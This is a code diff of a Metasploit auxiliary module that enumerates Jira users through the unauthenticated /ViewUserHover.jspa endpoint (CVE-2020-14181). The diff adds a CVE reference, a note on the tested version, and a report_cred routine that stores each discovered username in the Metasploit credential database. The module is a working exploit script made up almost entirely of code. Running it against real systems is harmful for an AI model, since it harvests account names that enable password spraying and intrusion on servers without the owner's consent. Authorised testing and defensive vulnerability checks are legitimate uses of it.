@@ -3,28 +3,30 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+
 
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Jira Users Enumeration',
       'Description'    => %q{
-        This module exploits an information disclosure vulnerability that allows an 
+        This module exploits an information disclosure vulnerability that allows an
         unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
         This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.12.0
         Discovered by Mikhail Klyuchnikov @__mn1__
+        This module was only tested on 8.4.1
       },
       'Author'         => [ 'Brian Halbach' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
           ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
+          ['CVE', '2020-14181'],
         ],
       'DisclosureDate' => '2020-08-16'
 
@@ -41,6 +43,41 @@ class MetasploitModule < Msf::Auxiliary
   end
   def base_uri
     @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa?username=")
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    # Test if password was passed, if so, add private_data. If not, assuming only username was found
+    if opts.has_key?(:password)
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user],
+        private_data: opts[:password],
+        private_type: :password
+      }.merge(service_data)
+    else
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user]
+      }.merge(service_data)
+    end
+
+    login_data = {
+      core: create_credential(credential_data),
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def user_list
@@ -68,9 +105,8 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_status("Begin enumerating users at #{vhost}")
-    print_status("Begin enumerating users at #{rhost}#{base_uri.to_s}")
-    
+    print_status("Begin enumerating users at #{vhost}#{base_uri.to_s}")
+
     user_list.each do |user|
       print_status("checking user #{user}")
     res = send_request_cgi!(
@@ -83,35 +119,18 @@ class MetasploitModule < Msf::Auxiliary
       print_bad("'User #{user} does not exist'")
     elsif res.body.include?('<a id="avatar-full-name-link"')
       print_good("'User exists: #{user}'")
+      report_cred(
+          ip: res.peerinfo['addr'],
+          port: datastore['RPORT'],
+          service_name: 'jira',
+          user: user
+        )
     else
       print_error("No response")
     end
   end
 
-    
-      
 
   end
-
-# def check_host(ip)
-  #   res = send_request_cgi(
-  #     'uri'     => base_uri,
-  #     'method'  => 'GET',
-  #     'headers' => { 'Connection' => 'Close' }
-  #   )
-
-  #   unless res
-  #     return Exploit::CheckCode::Unknown
-  #   end
-  #   if res.body.include?('Access denied')
-  #     # This probably means the Views Module actually isn't installed
-  #     print_error("Access denied")
-  #     return Exploit::CheckCode::Safe
-  #   elsif res.message != 'OK' || res.body != '[  ]'
-  #     return Exploit::CheckCode::Safe
-  #   else
-  #     return Exploit::CheckCode::Appears
-  #   end
-  # end
 
 end
